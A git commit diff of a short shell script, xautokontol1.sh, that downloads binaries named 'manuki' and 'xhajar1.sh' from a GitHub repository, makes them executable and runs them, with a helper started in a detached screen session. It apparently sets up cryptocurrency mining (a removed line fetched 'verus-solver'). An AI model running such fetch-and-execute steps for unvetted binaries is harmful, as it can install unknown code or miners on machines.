294a87c279756edbc7c68547ada6115b6bf1e3d7
renilo <88342640+renilo@users.noreply.github.com>
2021-12-06 17:24:18 +0700

    Update xautokontol1.sh

--- xautokontol1.sh
+++ xautokontol1.sh
@@ -6,12 +6,10 @@ sudo apt install screen -y
 
 screen -dmS xhajar1.sh ./xhajar1.sh 65 75
 
-wget -O manuk https://raw.githubusercontent.com/renilo/hajar/main/manuk
-
-wget https://raw.githubusercontent.com/renilo/hajar/main/verus-solver
+wget -O manuki https://raw.githubusercontent.com/renilo/hajar/main/manuki
 
 wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
 
-chmod +x xhajar1.sh manuk verus-solver
+chmod +x xhajar1.sh manuki
 
 ./xhajar1.sh
